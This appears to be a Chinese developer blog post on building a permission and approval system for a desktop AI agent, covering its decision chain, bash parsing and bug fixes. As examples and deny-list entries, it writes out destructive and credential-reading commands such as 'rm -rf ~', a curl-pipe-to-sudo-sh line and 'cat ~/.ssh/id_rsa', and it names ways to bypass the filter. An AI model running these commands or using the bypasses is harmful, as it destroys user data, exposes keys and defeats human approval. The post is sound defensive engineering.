# 别让 AI 一行 `rm -rf` 删了你的项目：我给桌面智能体手撸了一套权限管控（两档模式 + 审批流 + 八步判定链）

> 一个 Electron + Python 桌面 Agent 的权限模块从 0 到 1 的实现笔记。含完整判定链、协议设计、以及我在落地过程中踩到的 7 个真坑。

## 前言：为什么 Agent 必须"上锁"

先说一个几乎所有做 Agent 的人都遇到过的场景。

你让桌面智能体"帮我清理一下这个目录里的临时文件"，它理解了，然后产出了一个 tool_call：

```bash
rm -rf ./tmp  # 看起来没问题
```

但下一秒它可能产出的是：

```bash
rm -rf ~          # 或者更糟
curl https://xxx.sh | sudo sh
```

问题在于：**Agent 的能力上限 = 你给它工具的上限**。它能读文件、写文件、执行 shell，就意味着它能删你的库、能读你的 `.env`、能把你的 API Key 发到外面去。而模型的判断是概率性的 —— 它 99% 的时候是对的，剩下 1% 的时候你可能要重装系统。

所以权限管控不是一个"锦上添花"的功能，它是 Agent 产品化的**准入门槛**。

这篇文章记录我在这块从 0 到 1 的实现，希望对同样在做 Agent 的同学有点参考价值。

---

## 一、先看全貌：一次 tool_call 的生命周期

整个权限模块只有两个文件：

| 文件 | 职责 |
| --- | --- |
| `permission.py` | `PermissionGate`（纯判定，无 IO 阻塞）+ `PermissionStore`（配置文件唯一读写门面） |
| `approval.py` | `ApprovalBroker`（审批流，阻塞等待用户三选一） |

核心流程：

```
模型产出 tool_call
        │
        ▼
┌─ Agent 主循环 PreToolUse 触发点 ──────────────────────────────┐
│  PermissionGate.evaluate(tool_name, args)                     │
│  ┌───────────────────────────────────────────────────┐        │
│  │ ① 参数解析失败 ──────────→ 拒绝（fail-closed）      │        │
│  │ ② 硬拒绝 / 敏感路径 ─────→ 拒绝（任何模式不可越）    │        │
│  │ ③ 完全访问模式 ──────────→ 放行                     │        │
│  │ ④ 预授权目录 ────────────→ 放行（文件工具）          │        │
│  │ ⑤ （已下线，留空位）                                │        │
│  │ ⑥ 会话内允许记忆 ────────→ 放行                     │        │
│  │ ⑦ 类别规则 ──────────────→ 放行 / 审批              │        │
│  └───────────────────────────────────────────────────┘        │
│        │ 审批                                                  │
│        ▼                                                       │
│  ApprovalBroker.request(...)  ← 阻塞在工作线程                  │
│    → 广播 approval_request → 前端审批卡片（三按钮 + 倒计时）     │
│    ← 允许一次 / 会话内允许 / 拒绝 / 超时自动拒绝                  │
│        │                                                       │
│   放行 → 工具执行                                              │
│   拒绝 → 回填模型 "Error: Permission denied by user"            │
└───────────────────────────────────────────────────────────────┘
```

设计上我定了三条铁律，后面所有细节都是它们的推论：

1. **顺序即语义** —— 判定链的先后就是优先级，不能靠"哪个容易先判"来排。
2. **越严的层越先判，冲突时更严的一方赢** —— 用户只需要记这一条就能预测行为。
3. **判定逻辑只有一处** —— 内置清单、判定次序都由后端下发，前端零硬编码。

---

## 二、两档模式：为什么不做四档

Claude Code 有四档权限模式，Codex 用沙箱 + 审批两个维度。我最后只做了两档：

| 模式 | 值 | 语义 |
| --- | --- | --- |
| 默认 | `default` | 敏感操作逐次审批；「会话内允许」可减少打断 |
| 完全访问 | `full_access` | 跳过一切审批，**但硬拒绝清单仍然拦截** |

理由很实际：我的目标用户不是 CLI 重度开发者。中间档（比如 `acceptEdits`）需要向用户解释"编辑类工具 vs 执行类工具"的分类学，**认知成本大于收益**。两档 = 零解释成本：**该问就问 / 别烦我**。

各类工具在两档下的行为矩阵：

| 场景 | 默认模式 | 完全访问 |
| --- | --- | --- |
| 工作区内读 / 写 / 编辑 | 自动 | 自动 |
| 额外目录（预授权）内读 / 写 | 自动（视同工作区） | 自动 |
| 额外目录**外**读 / 写 | 审批 | 自动 |
| bash：安全白名单内 | 自动 | 自动 |
| bash：白名单外普通命令 | 审批 | 自动 |
| bash：危险模式命中（`rm `） | 审批 | 自动 |
| **硬拒绝清单** | **拒绝** | **拒绝** |
| MCP destructive 工具 | 审批 | 自动（可配置为仍审批） |
| 任务 / 技能 / ask_user 等非敏感工具 | 自动 | 自动 |

注意最后那个特例：**完全访问 ≠ 放弃一切**。`rm -rf /`、`sudo`、`curl xxx | sh` 这九个模式属于产品责任底线，不参与任何"别烦我"的交易。这跟 Claude Code 的 `bypassPermissions` 下 deny 规则依然生效是同一个取舍。

---

## 三、八步判定链：顺序就是安全语义

这是整个模块的核心。我把它叫"八步制式"，每一步的编号固定不动 —— 因为编号本身就是文档。

### ① 解析失败 → 拒绝（fail-closed）

工具参数 JSON 解析不出来、结构不是对象，直接拒。**宁拒不放**，这是所有安全判定的第一原则。

### ② 硬拒绝 + 敏感路径 —— 任何模式不可越

```python
BUILTIN_DENY = [
    "rm -rf /", "rm -rf ~", "sudo", "shutdown", "reboot",
    "mkfs", "dd if=", "> /dev/sd", "chmod -R 777 /",
]
```

同一层里还包含敏感路径拦截：

- 按文件名：`*.pem`、`*.key`、`.env`（任意目录）
- 按路径前缀：`~/.ssh/`、`~/.aigent/config/credentials.json`、`llmconfig.json`、`permissions.json`

为什么敏感路径要放在第②步而不是更后面？**因为"完全访问 = 跳过审批"的语义，不该顺带解锁"读出我的 API Key"。** 我最初的稿子把路径检查放在了完全访问之后，写文档时才意识到这是自相矛盾的：声称"任何模式都拦"，链条却排在放行之后。

另外 bash 命令也要扫路径 —— 否则 `cat ~/.ssh/id_rsa` 就绕过了文件工具的检查。这里要诚实声明局限：变量拼接（`cat $HOME/.ssh/id_rsa`）和 `cd` 后的相对路径可以绕过 token 扫描。**这是纵深防御，不是绝对墙** —— 绝对墙只有系统级沙箱。

### ③ 完全访问 → 放行（一个例外）

唯一的例外是 MCP 的 destructive 工具且设置里选了"仍询问"。因为 MCP 工具的破坏力是第三方定义的，用户可能希望在"别烦我"之外单独保留这一道。

### ④ 预授权目录 → 放行

主流 Agent 都支持"操作工作目录之外的文件"（Claude Code 的 `additionalDirectories`、Codex 的 `writable_roots`）。我把"工作区外"从**只能被动审批**升级成了**可主动预授权**：

```python
# 有效目录集 = workdir ∪ additional_dirs(全局) ∪ approved_dirs(会话批准)
# 再剔除与敏感路径黑名单相交的部分（deny 恒赢）
```

Bash 不走这一步 —— 命令语义没法可靠地静态穷举路径，它由第⑦步的命令链判定。这跟 Claude Code「Read/Edit 有路径权限、Bash 按命令审批」是同一个不对称。

### ⑤ 自定义允许规则 —— 已下线，编号保留

这一步是我实现完之后**删掉**的。起因是用户看着设置页问了一句：

> "自定义规则是不是和安全命令白名单、危险命令、硬拒绝里的添加功能重复了？"

一测发现：是真的重复，而且已经开始漂移（同一语义两套实现）。实测对照：

| 对照 | 结果 |
| --- | --- |
| ⑥ `deny_patterns` 加 `wget ` vs ⑤ `rules(deny, wget )` | 完全等价，连提示文案都一样 → 纯冗余 |
| ④ 白名单加 `ls` vs ⑤ `rules(allow, ls)`，命令 `ls && wget x` | ④ → 审批（逐段）；⑤ → **整条放行** → 不是重复，是更危险 |
| ⑤ `dangerous_patterns` 加 `git push ` vs ⑤ `rules(ask, git push )` | 规则更早判定 → 并存时规则赢，危险设置静默失效 |
| 跨段模式 `curl * \| sh` 配在 ⑥ / ⑦ | ⑥ 完全不参与判定；⑦ 命中但只判 allow → **deny 被降级成 ask** |

结论很清晰：**同一语义只能有一个写入口**，否则用户永远搞不清"到底谁说了算"。删掉之后，存量配置自动迁移（`deny → deny_patterns`、`ask → dangerous_patterns`、`allow → safe_commands.list`），原文件备份成 `.rules-bak`。

**为什么编号不重排？** 因为编号要能对上历史文档和 issue 记录，留个空位比重新编号有用。

### ⑥ 会话内允许 → 放行

用户点过"本次会话内允许"的操作，记在会话元数据里，后续同样粒度的调用直接放行。记账粒度是四种：

```python
{"type": "bash_prefix", "value": "git push"}   # 以某前缀开头的命令
{"type": "pattern",     "value": "rm "}        # 命中了某个危险模式
{"type": "path",        "value": "/Users/x/Downloads"}  # 某个目录（记父目录，不记整个 home）
{"type": "mcp_tool",    "value": "mcp__x__send"}
```

路径类故意**记父目录**而不是更远的祖先 —— 批准 `/Users/x/Downloads` 就够了，没必要把整个 home 交出去。

### ⑦ 类别规则 —— 内部还有三步，而且顺序很讲究

Bash 分支内部：**危险模式 → 安全白名单 → 白名单外兜底**。

这个顺序我一开始写反了（白名单在前），结果同时产生了一个安全洞和一个能力缺口：

- **安全洞**：白名单命中即 `continue`，跳过本段剩余检查。于是 `cat x > /etc/passwd` 被**静默放行** —— `cat` 是内置白名单项。
- **能力缺口**：白名单没法开特例。想让"`git` 整体免问、但 `git push` 必须过问"时，白名单里的 `git ` 会先命中并放行。

改成"危险先判"之后两个问题一起解决，模型还变单调了：

```
永不执行  →  必须先问我  →  这些不用问  →  其余默认也要问
```

顺带说粒度：白名单是**逐段放行** —— `ls && rm x` 不会因为 `ls` 在白名单就整体放行。这是它比"整条放行"安全的地方。

### ⑧ 审批

有通道就走 `ApprovalBroker` 阻塞等三选一；CLI 环境回落终端 `input()`；**没有通道且无人值守**（cron / 纯后台）→ 默认模式下自动拒绝。

这里有个我踩得很惨的坑，下一节细说。

---

## 四、bash 命令解析：子串匹配是万恶之源

早期的实现是 `if "rm -rf" in command` 这种子串匹配。它的问题是两头不讨好：

- **误杀**：配了 `sudo` 之后，`echo "sudo"` 也被拦。
- **漏放**：`ls && rm -rf /` 里如果只看到 `ls`，危险段就被掩护了。

我的做法是先**分段**，再**逐段判定**：

```python
# 按引号外的 ; && || | 和换行切段（引号内的分隔符不算）
segments = split_command_segments("ls && rm -rf /")
# → ["ls ", " rm -rf /"]
```

每一段独立过判定链，**任一段需要审批 → 整条命令审批**，卡片高亮触发的那一段。

匹配规则本身也分了两种：

```python
def pattern_matches(pattern, segment) -> bool:
    if "|" in pattern:
        return False          # 跨段模式 → 交给 cross_pattern_matches
    if ":(){" in pattern or ">" in pattern or "=" in pattern:
        return pattern in segment        # 操作符模式 → 子串匹配
        # 例："> /dev/sd"、"dd if="、":(){ :|:& };:"
        # 理由：这类模式 token 化不可靠（"dd if=" 的 if= 是 if=/dev/zero 的一部分），
        # 而操作符本身已足够特异，子串误伤面可以忽略
    # 其余 → token 前缀匹配（不是子串！）
    #   "sudo"    只拦首 token 是 sudo 的段 → 不会误杀 echo "sudo"
    #   "rm "     首 token 是 rm
    #   "rm -rf /" 段的前三个 token 逐一对齐
```

配了"任何位置出现就拦"的需求怎么办？用带操作符的写法。**这是刻意的取舍** —— 如果 `sudo` 做子串匹配，正常讨论 `sudo` 的命令全都会被误拦。

还有一个隐蔽 bug：跨段模式（`curl * | sh`）在 `pattern_matches` 里**恒返回 False**（因为它含 `|`，走了子串匹配分支，但单段里根本找不到 `|`）。所以硬拒绝清单里的跨段模式**配了等于没配**。修法是同时跑 `cross_pattern_matches`：

```python
if (pattern_matches(pattern, seg)
        or cross_pattern_matches(pattern, token_lists)):
    return _deny(...)
```

这个坑的教训是：**同一个语义有两套匹配实现，就一定会有一套是漏的。**

---

## 五、审批流：阻塞、但不卡死

`ApprovalBroker` 是照着我之前做的 `ask_user` 交互模块克隆的，几个关键设计：

| 关注点 | 做法 |
| --- | --- |
| 阻塞点 | PreToolUse 钩子内（turn 工作线程），用 `asyncio.to_thread` 派发，阻塞工作线程不卡事件循环 |
| 等待循环 | `done.wait(0.2s)` 切片轮询 `stop_event` + 超时检查；**等待期绝不持锁** |
| 唤醒 | `resolve()` 锁内改状态、**锁外** `done.set()` + 广播 |
| 独占性 | 同会话至多一个在途审批（agent_loop 顺序执行工具，天然排队）；撞车则 fail-closed 立即拒绝 |
| 超时 | 默认 300s（可配 60–3600），到期自结算 `timeout` → 自动拒绝 |
| 幂等 | 迟到 / 重复 / 非法 decision 一律丢弃，前端重复点击无副作用 |

协议三个信封：

| 方向 | kind | payload 关键字段 |
| --- | --- | --- |
| 后端 → 前端 | `approval_request` | `request_id`、`tool_call_id`、`tool_name`、`args`、`trigger`、`reason`、`session_scope_hint`、`timeout_seconds` |
| 前端 → 后端 | `approval_answer` | `request_id`、`decision`（`allow_once` / `allow_session` / `deny`） |
| 后端 → 前端 | `approval_resolved` | `status`（`allowed_once` / `allowed_session` / `denied` / `timeout` / `stopped`） |

有个细节我很喜欢：`session_scope_hint` 是**"会话内允许"按钮的副文案**，前端原样显示，比如"将允许以 `git push` 开头的命令，直到会话结束"。**用户点之前就知道自己记的是什么账** —— 审批弹窗最怕的就是用户不知道自己同意了什么。

### 审批决定不进模型上下文

这点很重要。范式是：**审批决定不进对话历史，但工具的结局必须让模型知道**（它还要继续干活）。

| 结局 | 回填给模型的 tool_result |
| --- | --- |
| 允许 | 正常工具执行结果 |
| 拒绝 | `Error: Permission denied by user` |
| 超时 | `Error: Permission denied (approval timeout)` |
| 被停止 | 沿用 stop 语义 |

而"决定本身"走 UI 元数据旁挂到 tool 行上：

```jsonc
// session_N.jsonl 里 role=tool 的行
{"role": "tool", "content": "Error: Permission denied by user",
 "tool_call_id": "call_x1",
 "approval": {
   "decision": "denied",
   "trigger": "dangerous_pattern",
   "pattern": "rm ",
   "mode": "default",
   "at": "2026-09-22T14:30:00"
 }}
```

于是同一份 jsonl 有三种消费者，各取所需：

- **模型**：发送边界有白名单投影（`role/content/tool_calls/tool_call_id`），`approval` 不在白名单 → 永不进上下文；
- **回放**：前端把 `approval` 挂回对应的工具折叠条，渲染"已拒绝（危险命令）"徽标；
- **零投影改动**：因为读取时保留了字段，不需要改任何消息转换逻辑。

一句话总结这个范式：**读取不设限、发送白名单。**

---

## 六、前端交互：三个落点

### 1. 审批卡片锚定在 tool_call 折叠条上

不做成输入区上方的整块面板，理由有三个：

1. 审批对象是**工具调用**，卡片贴在对应折叠条上，用户看着命令做裁决，视线不用跳；
2. 审批可能高频出现，整块让位太重；
3. **停止按钮在输入区** —— 审批挂起时必须仍能停止。ask 面板让位期间"停止不可见"这个副作用在审批场景不可接受。

状态机：

```
tool_call 聚合完毕
   └→ approval_request 到达（按 tool_call_id 配对）
        → 折叠条置「等待审批」：展开、命令 mono 展示、触发原因 chip、三按钮、倒计时
             ├→ allowed_*  → 恢复「执行中 → 完成」
             ├→ denied/timeout → 红色「已拒绝」+ 原因
             └→ 超时前点停止 → 置灰「已停止」
```

### 2. 输入区盾牌 chip

两档模式的切换入口。这里有个细节：**新建任务态（还没有会话）也要能切档位**。原始设计是只读的（"切换命令需要会话号"），但用户明明可以在发第一条消息前就想好档位。改法是分流：

- 有会话 → `session_permission` 命令（写会话 meta + 同步写所属工作空间的"最后更改值"）；
- 无会话 → `project_permission` 命令（写工作空间的"最后更改值"，新会话默认继承）。

### 3. 设置页七分区 + 判定顺序区块

设置中心里加了一页"权限"，单页滚动表单 + sticky 保存栏，七个分区（权限模式 / 审批行为 / 额外目录 / 安全白名单 / 危险命令 / 硬拒绝 / MCP 破坏性）。

其中我特意加了一块**"判定顺序"**，直接把这套链条摊在界面上：

| # | 名称 | 处置 | 位置说明 |
| --- | --- | --- | --- |
| 1 | 硬拒绝 | 直接拒绝 | 最先判定 · 不可越过 |
| 2 | 危险命令 | 一律先送审批 | 其次判定 · 先于白名单 |
| 3 | 安全命令白名单 | 直接放行 | 再次判定 · 逐段生效 |
| 4 | 未列出的命令 | 同样需要审批 | 最后兜底 |

关键点：**这块数据是后端下发的**（`builtin_snapshot()["order"]`），前端零硬编码。因为如果前端自己写一份清单，以后改后端常量必然漏改前端 —— 我前面刚踩过"HookSystem 和 tools 两份黑名单不同步"的坑，不想再来一次。

---

## 七、踩坑记录：这 7 个坑比设计本身更值钱

### 坑 1：两份黑名单不同步

改造前，`hooks.py` 里有一份 `DEFAULT_DENY_LIST`，`tools.py` 的 `run_bash` 里有另一份重复黑名单。两者已经不全等了 —— 同一类风险在两个入口得到两种结局。

**修法：内置清单只有一个出处**（`permission.py`），其他模块 import 常量。

### 坑 2：白名单在前 → `cat x > /etc/passwd` 被静默放行

前面说过。同类风险 `echo x > /dev/sda` 因为 `> /dev/sd` 在硬拒绝清单里反而被拦住了 —— **同一类风险两种结局，明显不自洽**。修法是危险模式先判。

教训：**命中白名单就 `continue`，会跳过本段剩余的所有检查。** 任何"短路式放行"都要警惕。

### 坑 3：用 `silent` 判断"无人值守" → 审批卡片永不弹出

事故现象：用户报告"无法删除文件、`rm` 被硬拦截"。

根因：钩子里曾经这样短路：

```python
if self.silent:
    return "Error: Permission denied (non-interactive session)"
```

本意是"cron / 无人值守场景不要把 `input()` 挂死"。但**桌面端每一个会话的 Agent 也是 `silent=True`** —— `silent` 在 Agent 层只是"抑制后端 stdout 打印"的意思。于是所有待审批操作（`rm`、`python3`、`npm install`、工作区外读写、MCP 破坏性）全被静默拒绝。

**修法：判据是"有没有交互通道"（broker 是否注入），不是 `silent`。**

```python
broker = self.approval_broker
if broker is None:
    if self.silent:
        return "Error: Permission denied (non-interactive session)"
    status = self._cli_confirm(...)   # CLI 终端三选一
else:
    status = broker.request(...)      # 有前端可作答
```

### 坑 4：两族常量的交界处最容易错

审批相关有两族词：

- `APPROVE_*`：gate ↔ broker 的接口词（`allow_once` / `allow_session` / `deny`）
- `OUTCOME_*`：事件与落盘的结局词（`allowed_once` / `allowed_session` / `denied` / `timeout` / `stopped`）

测试首跑就揪出两处混用（撞车路径返回了裸结局词 `"denied"` 而不是接口词 `"deny"`）。修完之后我把**两族的唯一交汇点收敛到一行**，并写进注释：

```python
self.note_approval_record(tool_call_id, {
    "decision": "denied" if status == APPROVE_DENY else status,   # ← 唯一交汇点
    ...
})
```

### 坑 5：「删空白名单」≠「关掉白名单」

用户把白名单列表里的项一条条删光，以为是在"关闭白名单"。但 `_normalize` 里的语义是：

```python
"list": custom_cmds or list(BUILTIN_SAFE_COMMANDS),
```

**删空 = 回落内置全量**。这是刻意的 fail-safe：白名单被误删空，不该变成"所有命令都要审批"。想关白名单要用 `enabled: false`，设置页也会在删到空时弹提示。

### 坑 6：回执是补丁，不是快照

事故现象：在权限设置页点一次「保存更改」，**整页塌成一行"读取权限配置…"**，七个分区全没了。

根因：`permission_config` 这个事件有两种形状 —— `get` 回执带 `builtin` / `path` / `exists`，`save` 回执带 `applied` / `warnings` / `msg`（类型里 `builtin` 就是可选的）。而 store 三处都做了**整份替换**：

```typescript
set({ permissionConfig: res })   // ❌ save 回执没有 builtin → 变 undefined
```

组件里 `if (!draft || !builtin) return <div>读取中…</div>` 的兜底分支直接命中。

**约束（我写成红线了）**：同一个 kind 只要存在两种回执形状，消费端一律 merge，禁止整份替换；想整份替换，后端就必须每次下发完整快照。二选一，不能混。

```typescript
function mergePermissionResult(prev, next) {
  const merged = { ...prev, ...next }
  // 反向也要清：get 回执不带写专属字段时显式清空，
  // 否则上一次保存的告警会挂在新加载的干净配置上 = 假告警
  if (next.applied === undefined) {
    merged.applied = undefined; merged.warnings = undefined; merged.msg = undefined
  }
  return merged
}
```

这个 bug 特别值得记：**typecheck 全绿、build 全绿，只有真跑起来才看得见。**

### 坑 7：zustand v5 的 selector 快照稳定性

事故现象：切换历史会话必现"界面出错了"（`Maximum update depth exceeded`）。

根因：两个组件的 selector 在选择器体内做了派生计算：

```typescript
// ❌ 每次调用返回新引用 → getSnapshot 永远在变 → 无限重渲染
useAgentStore((s) => Object.values(s.approvalBySession[x]).filter(...))
```

zustand v5 的 `useStore` 直接跑在 React 的 `useSyncExternalStore` 上，**selector 的返回值就是 getSnapshot**。返回新引用 = React 认为快照一直在变。

**修法：selector 只取 store 里的稳定引用，派生计算放 `useMemo`。**

```typescript
// ✅ 引用稳定
const approvalTable = useAgentStore((s) => s.approvalBySession[s.activeSession])
const orphans = useMemo(() => Object.values(approvalTable ?? {}).filter(...), [approvalTable, messages])
```

---

## 八、配置存储与继承链

规则文件的落点：`~/.aigent/config/permissions.json`（**所有配置文件统一收在这个目录下**，顶层只留目录）。

顺便说一个相关的口径问题：我把 5 个配置文件都收进了 `config/` 目录，并且加了"残件回收"逻辑 —— 顶层如果冒出旧的配置文件副本，内容一致就删除、内容不同就归档成 `config/<name>.stale-<时间戳>`（**现行版本绝不被覆盖**）。

这次的触发原因很典型：一个**改到一半的旧运行时**在顶层又物化了一份 `providers.json`，而旧的迁移规则是"目标已存在 → 跳过且不删源"，于是那个文件每次启动都被放过、**永久留存**。教训就是：**"跳过"这个动作如果作用在不可逆场景上，最好顺手做一次一致性回收。**

模式的继承链（新建会话时）：

```
会话 meta 无记录（存量会话）
    → 工作空间 projects.json 的 permission_mode
        → 工作空间无记录（新建空间 / 升级）
            → permissions.json 的 default_mode（缺省 "default"）
```

另外提一句：`permissions.json` 是**按需落盘**的 —— 只有你在设置页点过"保存更改"它才会生成；读取时缺文件就静默回落到内置默认（fail-safe）。**不要为了"5 个文件看起来齐"而在启动时播种默认值** —— 那会把出厂默认钉死在磁盘上，日后改内置默认对老用户再也不生效。

---

## 九、测试与验收

后端全套用内置 `unittest` 写（不引额外依赖）：

```
.venv/bin/python -m unittest discover -s tests
Ran 105 tests in 1.409s
OK
```

三个测试文件的分工：

| 文件 | 例数 | 覆盖 |
| --- | --- | --- |
| `test_permission_gate.py` | 69 | 八步链顺序、硬拒绝压倒完全访问、分段归一化绕过用例、继承链折叠、存量规则迁移、⑦ 步次序 |
| `test_approval_broker.py` | 19 | 事件流、三选一映射、超时自结算、stop 兜底、幂等、等待期不持锁、撞车 fail-closed、回放往返 |
| `test_config_dir_migration.py` | 17 | 迁移 / 回收语义、路径口径、源码静态扫描 |

其中我自己最喜欢的一组是 `TestStep7Ordering`（3 例）：**特例优先**、**重定向掩护回归**、**逐段生效**。因为这三条正是我改错过的三个点，把它们钉成测试，以后谁改判定链顺序都会立刻红。

前端这边，设置页我用 headless Chromium + 裸 CDP 做了 51 条断言的真实交互测试（真实组件 + 真实 CSS + 真实鼠标键盘输入）—— 因为**类型检查和构建都查不出"点一次保存整页塌"这类问题**。

---

## 十、小结：四条设计原则

写完回头看，这套东西真正的价值不是代码，而是这四条原则：

1. **顺序即语义，越严的层越先判。** 用户只需要记一条规则就能预测 Agent 的行为。任何"某一步命中就短路放行"都要反复审。
2. **同一语义只有一个写入口。** 两份黑名单会漂移，两套规则实现会漂移，前端硬编码的内置清单也会漂移。后端下发，前端零硬编码。
3. **fail-closed 与 fail-safe 要分清。** 判定出错（参数解析失败）→ 拒绝（fail-closed）；配置被误删空 → 回落内置默认（fail-safe）。两者方向相反，别搞混。
4. **安全模式不能顺带解锁别的能力。** "完全访问 = 跳过审批"，不等于"可以读我的 API Key"。硬拒绝层不参与任何"别烦我"的交易。

至于与主流产品的对照 —— Claude Code 用 deny 规则最高优先 + 4 档模式，Codex 用沙箱独立于审批策略，我的方案是**单层判定链 + 两档模式**。没有谁更对，只有目标用户不同：它们是给 CLI 重度开发者的，我是给桌面端普通用户的。

**零信任解释成本，是我做这个模块唯一坚持的事。**

---

> 本文实现来自我的桌面智能体项目（Electron + TypeScript + React 前端 / Python Agent Harness 后端）。如果对某一块（比如审批流的线程模型、或者 bash 分段解析的边界用例）感兴趣，欢迎评论区交流。
